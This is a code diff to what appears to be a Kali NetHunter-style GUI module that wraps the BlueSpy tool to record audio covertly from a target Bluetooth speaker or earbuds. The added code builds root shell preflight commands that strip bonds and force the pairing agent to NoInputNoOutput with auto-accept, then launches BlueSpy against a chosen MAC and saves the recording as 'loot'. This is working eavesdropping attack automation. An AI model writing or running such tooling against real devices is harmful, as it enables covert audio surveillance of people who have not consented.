@@ -21,7 +21,7 @@ from gi.repository import Adw, GLib, Gtk
 from ..executor import Process, Result, run_async
 from ..loot_store import get_loot_store, loot_path
 from ..module import NHModule, register
-from ..widgets import OutputView, ToolRunner, toast
+from ..widgets import OutputView, ToolRunner, services_banner, toast
 
 # --- BlueSpy install target -----------------------------------------
 BLUESPY_DIR = Path("/opt/bluespy")
@@ -49,6 +49,10 @@ class Bluetooth(NHModule):
         box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=12)
         for m in ("top", "bottom", "start", "end"):
             getattr(box, "set_margin_" + m)(12)
+
+        # Services banner (managed centrally in Kali Services)
+        box.append(services_banner(
+            self.app_window, ['bluetooth']))
 
         # ---- adapter state -------------------------------------
         adapter = Adw.PreferencesGroup(
@@ -165,6 +169,17 @@ class Bluetooth(NHModule):
             "Duration (s) -- 0 = manual Stop")
         self.record_duration.set_value(30)
         bs.add(self.record_duration)
+
+        # BR/EDR speakers, LE-only earbuds, and dual-mode devices
+        # take different address-type hints. Default BR_EDR because
+        # 90 % of speaker targets are Classic-only.
+        self.addr_type = Adw.ComboRow(title="Address type")
+        self.addr_type.set_model(Gtk.StringList.new([
+            "BR_EDR (Classic BT speakers, HFP, A2DP)",
+            "LE_PUBLIC (BLE earbuds, most public LE devices)",
+            "LE_RANDOM (privacy-enabled LE devices)",
+        ]))
+        bs.add(self.addr_type)
 
         rec_row = Adw.ActionRow(
             title="Record microphone",
@@ -305,7 +320,18 @@ class Bluetooth(NHModule):
         the recording cleanly; duration 0 falls through to a plain
         run that the Stop button terminates. The output filename is
         stamped so the operator can trigger multiple recordings in
-        the same session without clobbering the previous file."""
+        the same session without clobbering the previous file.
+
+        A preflight ``bluetoothctl disconnect`` clears any stale
+        connection state -- BlueSpy fails with
+        ``br-connection-refused`` or ``br-connection-key-missing``
+        if the target is already half-connected. We also feed the
+        BlueSpy address-type hint from what ``bluetoothctl info``
+        says about the device: BR/EDR-only speakers refuse the
+        LE-shaped pairing bypass silently (BlueSpy still logs
+        "device is vulnerable" because that flag comes from the
+        LE handshake, not the eventual audio connect).
+        """
         mac = self.mac.get_text().strip()
         if not mac:
             toast(self.app_window, "Set a target MAC first")
@@ -323,28 +349,76 @@ class Bluetooth(NHModule):
         outfile = "%s/bluespy-%s-%s.wav" % (
             rec_dir, safe_mac, stamp)
 
-        # Build the command. BlueSpy.py wants the output on ``-f``,
-        # not ``-o`` (that was a bug in the earlier version of this
-        # module). ``timeout`` from coreutils is the cheap way to
-        # bound the run without a shell trap.
-        core = ("python3 BlueSpy.py -a %s -f %s"
-                % (mac, outfile))
+        # BlueSpy accepts BR_EDR / LE_PUBLIC / LE_RANDOM. The combo
+        # row lets the operator pick; default is BR_EDR because most
+        # speaker targets are Classic.
+        addr_type = ["BR_EDR", "LE_PUBLIC", "LE_RANDOM"][
+            self.addr_type.get_selected()]
+
+        # Preflight:
+        #   1. Force-disconnect + remove any stale bond so BlueSpy
+        #      walks a clean pairing path.
+        #   2. Put BlueZ's agent into ``NoInputNoOutput`` with
+        #      auto-accept. Without this, BlueZ falls back to the
+        #      distro default (usually ``KeyboardDisplay``) which
+        #      pops a graphical PIN confirm on the *attacker* side
+        #      -- the user has to click Yes before BlueSpy proceeds.
+        #      By running ``bt-agent`` in the background as
+        #      NoInputNoOutput we auto-consent to everything on our
+        #      side while the target (FlowBox etc.) still shows no
+        #      prompt of its own.
+        #   3. Force pairing agent NoInputNoOutput via btmgmt as
+        #      belt-and-suspenders in case bt-agent isn't around.
+        # bluetoothctl exits 0 even when the device wasn't there, so
+        # this is safe to run unconditionally.
+        preflight = (
+            "bluetoothctl disconnect %s 2>&1 | head -3; "
+            "bluetoothctl remove %s 2>&1 | head -3; "
+            "btmgmt io-cap 3 2>/dev/null; "
+            "btmgmt bondable on 2>/dev/null; "
+            "pkill -f 'bt-agent.*NoInputNoOutput' 2>/dev/null; "
+            "( bt-agent -c NoInputNoOutput --daemonize "
+            "  >/dev/null 2>&1 || true ); "
+            "sleep 1"
+        ) % (mac, mac)
+
+        core = (
+            "python3 BlueSpy.py -a %s -t %s -f %s"
+        ) % (mac, addr_type, outfile)
         if duration > 0:
             core = "timeout --signal=INT %d %s" % (duration, core)
 
+        # BlueSpy sometimes fails on the eventual bluetoothctl
+        # connect after key exchange even though the vuln is real.
+        # If that happens, follow up with a manual retry after a
+        # trust+connect cycle so the operator sees the diagnostic
+        # in the log rather than a silent failure.
         script = (
             "mkdir -p %s && "
             "chown kali:kali %s 2>/dev/null || true; "
-            "cd %s && %s"
-        ) % (rec_dir, rec_dir, BLUESPY_DIR, core)
+            "%s; "
+            "cd %s && %s; "
+            "rc=$?; "
+            "if [ $rc -ne 0 ] && [ ! -s %s ]; then "
+            "  echo; "
+            "  echo '# BlueSpy could not complete the connect step.'; "
+            "  echo '# Diagnostic:'; "
+            "  bluetoothctl info %s 2>&1 | "
+            "    sed -n '/Name\\|Class\\|Icon\\|Paired\\|Bonded\\|"
+            "Trusted\\|Connected\\|UUID: Audio\\|UUID: Handsfree"
+            "\\|UUID: Headset/p'; "
+            "  echo '# BR/EDR-only speakers with A2DP + HFP often'; "
+            "  echo '# advertise Just-Works but still require a'; "
+            "  echo '# real BR/EDR link key at connect time.'; "
+            "fi"
+        ) % (rec_dir, rec_dir, preflight,
+             BLUESPY_DIR, core, outfile, mac)
 
         self.runner.output.append(
-            "# recording %s → %s (%s)\n"
+            "# recording %s → %s (%s, addr type %s)\n"
             % (mac, outfile,
-                ("%ds" % duration) if duration else "manual"))
-        # ToolRunner owns the subprocess and its Stop button is at
-        # the bottom of the module -- the local Stop button also
-        # calls into it.
+                ("%ds" % duration) if duration else "manual",
+                addr_type))
         self.runner.run(["sh", "-c", script], root=True)
         # Register the loot row up front so the file shows up in
         # Loot even if the process is killed early.
